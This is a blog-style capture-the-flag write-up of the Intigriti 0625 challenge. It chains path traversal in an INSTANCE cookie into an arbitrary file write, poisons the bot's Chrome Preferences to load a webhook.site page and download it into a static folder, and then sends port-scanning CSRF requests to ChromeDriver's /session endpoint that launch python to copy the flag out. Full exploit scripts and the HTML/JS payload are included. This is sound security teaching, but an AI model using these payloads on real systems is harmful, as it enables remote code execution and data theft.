---
title: Intigriti 0625 writeup
date: 2025-07-12 18:13:25
tags:
---
My writeup is based on:

https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/0625

https://sifuen.com/writeups/intigiri-06250-by-tog-solution#bruteforcing-the-chromedriver-port

Thankful for such an amazing writeups 😁

If I give small introduction to the functionality of web-app so there is login page

![](/images/image.png)

and then we can see we can add notes and download it as well and this challenge is of rce

![](/images/image%201.png)

 but we have been given a bot(submit the url).We will see why it’s there!!

There is login functionality and we are given instance_id and session.

Let’s check the source code:

```python
ROUTES.py

def sanitize_username(username):
    return re.sub(r'[^A-Za-z0-9_.-]', '', username)
```

in `username`- only `alphanumeric characters, _` and  `.`  is allowed

for instance_id:

```python
instance_manager.py
...
def is_valid_instance_id(instance_id):
    if not instance_id:
        return False
    
    instance_dir = os.path.join(INSTANCES_DIR, instance_id)
    return os.path.exists(instance_dir)   # it checks whether this path only exists
                                                                                    #	INSTANCES_DIR/instance_id
def get_or_create_instance_id():
    if 'instance_id' in session and is_valid_instance_id(session['instance_id']):
        return session['instance_id']
    
    instance_id = request.cookies.get('INSTANCE')
    
    if not is_valid_instance_id(instance_id):
        instance_id = str(uuid.uuid4())
        print(f"Creating new instance: {instance_id}")
    
    instance_dir = os.path.join(INSTANCES_DIR, instance_id)
    if not os.path.exists(instance_dir):  #	doesn't exist INSTANCES_DIR/instance_id
        os.makedirs(instance_dir)      # makes the directory INSTANCES_DIR/instance_id
        os.makedirs(os.path.join(instance_dir, "notes"), exist_ok=True)
        os.makedirs(os.path.join(instance_dir, "chrome_profile"), exist_ok=True)
    
    update_instance_timestamp(instance_id, app=current_app)
    
    session['instance_id'] = instance_id
    
    return instance_id
    ...
----------------------------------------------------------------------------------------

app.py
@app.before_request
def before_request():
    if request.endpoint != 'static':
        instance_id = get_or_create_instance_id()
        
        previous_instance = session.get('instance_id')
        
        if previous_instance and previous_instance != instance_id:
            logout_user()
...
```

![](/images/image%202.png)

Its a flowchart how instance_id and session are created and validated.

Moreover if we pay attention there is no sanitization on instance_id, and instance id is used at multiple locations.

like it’s been appended to path `cwd/instances`  and here as well:

```python
def get_chrome_options(instance_id):
    chrome_options = Options()
   
    chrome_options.add_argument("--headless")
    chrome_options.add_argument(f"--user-data-dir={get_instance_path(instance_id, 'chrome_profile')}")
...
```

•The `INSTANCE` cookie acts as an isolation mechanism. The `INSTANCE` cookie is used to determine which folder to store the Selenium Chrome Profile (the `--user-data-dir` argument) and where to store your uploaded notes. This isolates each challenge participant on the challenge server.

Interestingly, the `is_valid_instance_id` function doesn't check whether the `instance_id` looks like a real UUID. Instead, it just checks if a folder exists at this path:

```
/app/instances/[instance_id]
```

![](/images/image%203.png)

That means we can **trick it** by using **path traversal** — like `../../../../tmp` — to break out of the `/app/instances` folder and point somewhere else on the system.

How? Easy:

- If we **clear our session cookie** (so there's no stored `instance_id`)
- And we manually set the `INSTANCE` cookie to `../../../../tmp`

Then when the app checks if `/app/instances/../../../../tmp` exists, it sees that `/tmp` *does* exist — so it accepts it!

In the end, we've successfully **faked an instance directory** outside the intended folder, and can write files into `/tmp` or elsewhere.

`!!!!` there is a vulnerability of `PATH TRAVERSAL`

as we can put any value `"..",".","../static"` in INSTANCE no input sanitization !!

If u are confused just remember here instance_id is vulnerable to path traversal and u should not have instance_id bind to the session for that delete the previous cookies and ensure your INSTANCE and instance id are same

Let’s have a look at notes upload functionality:

```python
utils.py

def sanitize_filename(filename):
    return re.sub(r'[^A-Za-z0-9_/]', '', filename)
    # alphanumeric, _ and / allowed
    
----------------------------------------------------------------------------------------

routes.py

 @app.route('/api/notes/upload', methods=['POST'])
    @login_required
    def upload_note():
        instance_id = get_or_create_instance_id()
        
...

        notes_dir = get_instance_path(instance_id, "notes")   # <instance_id>/notes
        os.makedirs(notes_dir, exist_ok=True)
        
        user_dir = os.path.join(notes_dir, current_user.username)  
                                                           # <instance_id>/notes/<username>
        os.makedirs(user_dir, exist_ok=True)     
        
        filename = sanitize_filename(file.filename)
        file_path = os.path.join(user_dir, filename) 
                                             # <instance_id>/notes/<username>/<filename>
...     
        download_link = f'/download/{current_user.username}/{filename}'
...
```

for `filename` as you can see only `alphanumeric characters, / and _`  are allowed.

and its appended to path `<instance_id>/notes/<username>/<filename>`  

At step [0], the app joins `"/app/instances"` with our `instance_id`. This normally limits where files can go. But since `instance_id` isn't sanitized, we can use `../` to break out of that folder.

At step [1], it adds a `"notes"` directory to the path. That might seem like a blocker.

At [2], it adds the `username`, which *is* sanitized — but it still allows dots (`.`), so we can set it to `".."` to go up one folder.

At [3], it adds the `filename`, which only allows alphanumerics and slashes, but that’s fine — we can control that too.

So if we upload a file with:

- `instance_id = "../../tmp"`
- `username = ".."`
- `filename = "/test"`

Then the final path the server writes to will be:

```
"/app/instances" + "../../tmp" + "/notes" + "/.." + "/test"
→ /app/instances/../../tmp/notes/../test
→ /tmp/test
```

Boom — we wrote to `/tmp/test`, even though we were supposed to be limited to `/app/instances/[your id]/notes/[username]/`.

`ARBITRARY FILE WRITE`

let’s check that are we able to do this!!

```python
import requests
import os

HOST = "http://localhost:1337"

session = requests.Session()

def register(username, password):
    request = session.post(HOST + "/api/register", json={
        "username": username,
        "password": password,
    })

def login(username, password):
    request = session.post(HOST+"/api/login", json={
        "username": username,
        "password": password,
    })

def upload(filename, content):
    request = session.post(HOST+"/api/notes/upload", files={
        "file": (filename, content)
    })

def arbitrary_file_write(path, content):
    username= ".."
    password= "password"
    directory, filename= os.path.dirname(path), os.path.basename(path)
    session.cookies.set("INSTANCE", f"../../../../../..{directory}")
    register(username, password)
    login(username, password)
    upload(filename, content)

if __name__ == "__main__":
    arbitrary_file_write("/tmp/test", b"Hello World!")
```

```bash
docker compose exec web cat /tmp/test
Hello World!
```

hurray did it!!

Now there are `two directories` that are `created` as soon as a `user is created` one is `notes` and the other one `chrome_profile` 

`chrome_profile`  directory is also the chrome’s user data directory and it creates for every instance to run the bot in and we can even overwrite this through path traversal vulnerability.

(We will see how)

**Chrome’s user data directory**   (`—user-data-dir`)

This is a Chrome command-line flag that means:

> “Use this folder to `store everything related to this browser session` — cookies, localStorage, tabs, extensions, preferences, history, etc.”
> 

It's like giving `chrome a custom home folder`.

without this → 🧨 All bot sessions would share the same browser state — which is **very dangerous** in a CTF or multi-user app.

so this command is used → to **`isolate each bot session`** into its own private Chrome environment.

The directory is **`only filled when the bot is run once`**, so we will trigger it by giving [http://localhost:1337/](http://localhost:1337/) 

```bash
 docker compose exec -w /app/instances/14cf7c8d-cb08-4b29-b364-ad5ea6014e8a/chrome_profile -it web bash
$ ls -F
 Default/     GrShaderCache/      'Last Version'   ShaderCache/   chrome_debug.log       extensions_crx_cache/   first_party_sets.db-journal
'First Run'   GraphiteDawnCache/  'Local State'    Variations     component_crx_cache/   first_party_sets.db     segmentation_platform/
```

```bash
 $ ls -F Default/
'Account Web Data'               Favicons                            PreferredApps                    'Top Sites-journal'
'Account Web Data-journal'       Favicons-journal                   'Reporting and NEL'                TransportSecurity
'Affiliation Database'          'Feature Engagement Tracker'/       'Reporting and NEL-journal'       'Trust Tokens'
'Affiliation Database-journal'  'GCM Store'/                        'SCT Auditing Pending Reports'    'Trust Tokens-journal'
 AutofillStrikeDatabase/         GPUCache/                          'Safe Browsing Cookies'           'Web Data'
 BookmarkMergedSurfaceOrdering   History                            'Safe Browsing Cookies-journal'   'Web Data-journal'
 BudgetDatabase/                 History-journal                    'Secure Preferences'               WebStorage/
 Cache/                          LOCK                               'Segmentation Platform'/           blob_storage/
 ClientCertificates/             LOG                                 ServerCertificate                 chrome_cart_db/
'Code Cache'/                   'Local Storage'/                     ServerCertificate-journal         commerce_subscription_db/
 Cookies                        'Login Data'                        'Session Storage'/                 discounts_db/
 Cookies-journal                'Login Data For Account'             Sessions/                         heavy_ad_intervention_opt_out.db
 DIPS                           'Login Data For Account-journal'    'Shared Dictionary'/               heavy_ad_intervention_opt_out.db-journal
 DawnGraphiteCache/             'Login Data-journal'                 SharedStorage                     optimization_guide_hint_cache_store/
 DawnWebGPUCache/               'Network Action Predictor'           Shortcuts                         parcel_tracking_db/
'Download Service'/             'Network Action Predictor-journal'   Shortcuts-journal                 shared_proto_db/
'Extension Rules'/              'Network Persistent State'          'Site Characteristics Database'/   trusted_vault.pb
'Extension Scripts'/             PersistentOriginTrials/            'Sync Data'/
'Extension State'/               Preferences                        'Top Sites'
```

In default directory we can see there are storage and configuration files, let’s check Preference file

Preference file is a giant JSON collection of user settings.

- In Chrome, it's possible to set a custom **homepage URL** that loads automatically when the browser starts. This behavior can be leveraged to open any desired URL at launch. **`~startup url`**
- Additionally, Chrome allows you to change the **`default download directory`**. Instead of saving files to the standard `~/Downloads` folder, you can configure it to download to a custom path of your choice.

We have arbitrary file write vulnerability and in this preference file one can write the startup url and set the download directory.

So what if we just write a webhook_url in startup_url and host a html file in the [webhook.site](http://webhook.site) and it will be downloaded (set the content-type acc. so it get downloaded instead of opening as web page) in the folder of our choice (suppose, `/app/static`) 

And once it is downloaded we can give the url `http://localhost:1337/static/<filename>.html` to selenium to visit the webpage we downloaded it and it will be opened as HTML/ javascript.

Sounds overwhelming 😃 ?? Once again read the last para u will understand 😌

---

Below [0] script will login and register through instance where we will exploit path traversal and [1] we will change the preference file of diff account and [2]use the instance id of that diff account u manually just normally create the account:

```python
------------script 1------------
import requests
import os
import json
import re

HOST = "http://localhost:1337"

session = requests.Session()

def register(username, password):
    request = session.post(HOST + "/api/register", json={
        "username": username,
        "password": password,
    })

def login(username, password):
    request = session.post(HOST+"/api/login", json={
        "username": username,
        "password": password,
    })

def upload(filename, content):
    request = session.post(HOST+"/api/notes/upload", files={
        "file": (filename, content)
    })

def sanitize_filename(filename):
    return re.sub(r'[^A-Za-z0-9_/]', '', filename)

def arbitrary_file_write(path, content):
    username= ".."
    password= "password"
    directory, filename = os.path.dirname(path), os.path.basename(path)
    session.cookies.set("INSTANCE", f"/../../../../..{directory}")
    register(username, password)
    login(username, password)
    upload(filename, content)

preferences = {
    "download": {
        "default_directory": "/app/static"
    },
    "session": {
        "restore_on_startup": 4,
        "startup_urls": ["https://webhook.site/cb9e56b1-64c0-4407-84fb-ef87822e6973/hello.html"]
    }
}

content = json.dumps(preferences).encode()

if __name__ == "__main__":
    arbitrary_file_write(f"/app/instances/9f99e75c-a381-46b5-ab3b-3cc2a4d409e4/chrome_profile/Default/Preferences",
                        content)
```

and in the webhook 

```python
content-type: application/octet-stream
# so that html file hosted on webhook gets downloaded instead of opening it as webpage

content: <payload>  # below there is a file for rce
```

With this we are able to execute js on chrome like XSS.

That sounds nice but still no RCE!!

## **`SELENIUM USAGE`-——-—-—-——-——————————**

After log in, a URL input box appears in the top right corner. Submitting a URL there triggers a call to the `/api/visit` endpoint.

![](/images/image%204.png)

Let’s examine the `/api/visit` endpoint.

![](/images/image%205.png)

It extracts the URL from the request and passes it to `validate_url(url)`. If validation fails, the request is rejected.

Next, it calls `get_chrome_options()` to retrieve Chrome’s launch arguments, and then uses `driver.get(url)` to instruct Selenium to open the Chromium browser and navigate to the provided URL.

The browser remains open for 15 seconds before being closed.

The `validate_url` function is very straightforward—it simply checks whether the URL starts with `"http://localhost:1337/"`. This strict condition ensures that the browser can only be directed to local addresses and not to any external domains.

![](/images/image%206.png)

The `get_chrome_options()`function is fairly straightforward. It configures several Chrome options, but avoids insecure flags like `--disable-web-security`, which would weaken protections such as CORS. Notably, it sets the `--user-data-dir` flag to point to the instance’s `chrome_profile` directory.

Since the browser runs in headless mode using Selenium, its control ports (like **`ChromeDriver`** and **`Chrome DevTools`**) stay open so the browser can be controlled from outside.

They `let **you control Chrome programmatically from outside**` — and that's **exactly** what the exploit needs.

### How Does CDP (Chrome Devtools protocol ) Work?

- It uses **`WebSocket`** (not HTTP like WebDriver).
- Your automation tool connects to a **DevTools WebSocket endpoint** exposed by Chrome.
- You send JSON-formatted **commands** and receive **events/responses**.

### What is ChromeDriver?

ChromeDriver is a **server** that implements the WebDriver protocol for Chrome. It allows tools like **Selenium** or **Puppeteer** to automate browser interactions.

### WebDriver Protocol = `JSON` over `HTTP`

- The client (e.g. Selenium, Puppeteer, a custom script) sends **HTTP requests with JSON bodies**.
- The server (e.g. ChromeDriver, GeckoDriver) interprets them, controls the browser, and sends **JSON responses**.

**Behind the scenes:**

- Selenium talks to `ChromeDriver`
- ChromeDriver translates commands to Chrome DevTools commands
- Browser performs actions and sends back response

To use the **`Chrome DevTools API`** to run JavaScript in the browser controlled by Selenium.

The idea was:

➡️ Use something like `window.location = "file:///"` to load local files

➡️ Then use the DevTools API to run JavaScript that clicks the flag and reads its contents.

But  how to actually **connect to the Chrome DevTools API**:

1. You go to:
    
    `http://localhost:[devtools port]/json/list`
    
    → This shows all open tabs in Chrome, each with a WebSocket link like:
    
    `ws://127.0.0.1:9222/devtools/page/[random-tab-id]`
    
2. You connect to that WebSocket link.
3. Then you can run things like `Runtime.evaluate` to execute JavaScript in the tab.

But here’s the problem:

In our setup, the browser is running at `localhost:1337`, and we’re trying to access the DevTools API on another localhost port (like `9222`).

🛑 Modern browser security (Same-Origin Policy) blocks pages from `localhost:1337` from reading responses from other ports like `9222`.

So even if we could guess the WebSocket URL, we:

- **Can’t fetch the list of open tabs**
- **Can’t connect to the WebSocket**
- **Can’t use the DevTools API**

Which means: **this attack won’t work directly from the browser**.

**WHAT can we do with these two why are we even talking about these??**  🤔

thinks will make sense just get along 😅

## Main question→ `How RCE through chrome driver API??`

This issue is reported in 2020 → https://issues.chromium.org/issues/40052697 

You can run your own code (RCE) on the `/session` endpoint by giving it a fake binary and arguments.

Any website can send a request to this endpoint because:

- The request is simple and allowed by CORS rules.
- Even though the body is JSON, it doesn’t check the `Content-Type`.
- It also doesn’t care which “localhost” origin the request comes from — it accepts them all.

It’s detailed explanation here:

The `ChromeDriver API` is pretty cool. Normally, ChromeDriver API is used through libraries like Selenium. If you dig around, you’ll discover that ChromeDriver has an endpoint called `/session`, which you can use to start a new Chrome browser session.

For example, if ChromeDriver is running on port 50000, you can open a new Chrome window like this:

```bash
curl http://localhost:50000/session \
    -d '{"capabilities":{"alwaysMatch":{"browserName":"chrome"}}}'
```

- This sends a **POST request** to the **ChromeDriver API** at `http://localhost:50000/session`.
- The goal is to **start a new browser session**.
- The JSON payload tells ChromeDriver:
    
    “Start Chrome (`browserName: chrome`) using the default settings.”
    

### 🔧 Breakdown:

- `capabilities`: This tells ChromeDriver `what kind of browser` and `settings you want`.
- `alwaysMatch`: Specifies `required settings`. In this case, just the `browser type` is defined.

### 🧠 Result:

A **new Chrome window** is launched with **default options**.

-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-

```bash
curl http://localhost:50000/session \
  -d '{
    "capabilities": {
      "firstMatch": [{
        "browserName": "chrome",
        "goog:chromeOptions": {
          "args": ["--headless", "--disable-gpu"],
          "binary": "/usr/bin/google-chrome"
        }
      }]
    }
  }'

```

                                                                  `OVERWHELMING??` >< here’s the breakdown

- It also starts a **new Chrome session**, but with **custom options**.
- You're telling ChromeDriver:
    
    > “Use this specific Chrome binary, and launch it with these command-line arguments.”
    > 

### 🔧 Breakdown:

- `"firstMatch"`: Another way to define browser capabilities (like `alwaysMatch`, but more flexible for multiple setups).
- `"args"`:
    - `-headless`: Runs Chrome **without opening a window** (invisible).
    - `-disable-gpu`: Disables GPU hardware acceleration (used for compatibility in headless mode).
- `"binary"`: Tells it **exactly which Chrome binary** to run (could also be replaced with something like `/usr/bin/python` for RCE).

### 🧠 Result:

A **headless** Chrome instance is launched from a **specific location** with **custom behavior**.

---

### ⚠️ Why is this powerful?

- You’re **controlling how and what Chrome runs** — not just opening tabs, but even telling it what program to launch.
- If you can change `"binary"` to something like `python` or `bash`, you might be able to execute arbitrary code — which is a **serious security risk**.

At first, it looked like we had a clear shot at getting **RCE 🧨** and stealing the flag 🏴. But then came the question:

**Will Same-Origin Policy block us again? 🤔**

Luckily, no! 😌

The Same-Origin Policy mainly stops you from **reading responses** from other domains 🌐 — it **doesn’t stop you from sending requests**. That’s why our DevTools idea failed earlier: we needed to **read** the WebSocket URL 📡, and the browser said ❌.

Now the big question is:

**What port is ChromeDriver running on? 🔍**

We need that info to send our next move. 💥

## ChromeDriver Port

When ChromeDriver starts, it picks a random port number. This means we don’t know which port to send our request to.

here i will take port range from 32768 to 60999 (depends on linux system)

Why this range (32768-60999) explained here : https://book.jorianwoltjer.com/web/client-side/headless-browsers#websocket 

Looping the ports and adding binary and ARGS to exfiltarte the flag.

```python
-----------script 2-------------
# csrf to rce chromeDriver payload
<html>
<body>
<script>
  const options = {
    mode: "no-cors",
    method: "POST",
    body: JSON.stringify({
      capabilities: {
        alwaysMatch: {
          "goog:chromeOptions": {
            binary: "/usr/local/bin/python",
            args: ["-c", "__import__('os').system('cat /flag* > /app/static/flag.txt')"
],
          },
        },
      },
    }),
  };
# scanning the port 
  for (let port = 32768; port < 61000; port++) {
    fetch(`http://127.0.0.1:${port}/session`, options);
  }
</script>

</body>
</html>
```

## `Full attack exploit` 😄💥

1. Login in as a normal user just make sure u deleted previous instance and session.
2. Then one more thing to make sure after u made an account your INSTANCE and instance id should be same.
3. Trigger the bot by reporting [http://localhost:1337/](http://localhost:1337/)  this will create chrome_profile files
4. Add it in appropriate location in script 1 and host html page of script 2 with content type: application/octet-stream on [webhook.site](http://webhook.site)  and add this webhook.site link in script 1 
5. Run script 1 (it will modify the preference file: changing default download directory and adding startup_url)
6. Trigger the bot again it will go on [webhook.site](http://webhook.site) and save script 2 with name exploit.html in app/static/
7. Run the script 1 again but with changes that change download directory to /tmp and remove [webhook.site](http://webhook.site) link so that it doesn't ping webhook.site everytime bot visits localhost
8. Now trigger bot with [http://localhost:1337/static/exploit.html](http://localhost:1337/static/exploit.html) and it will be opened as webpage and boom💥 RCE !! 
9. Now this will add /static/flag.txt just visit [http://localhost:1337/static/flag.txt](http://localhost:1337/static/flag.txt) and u will see the flag ⛳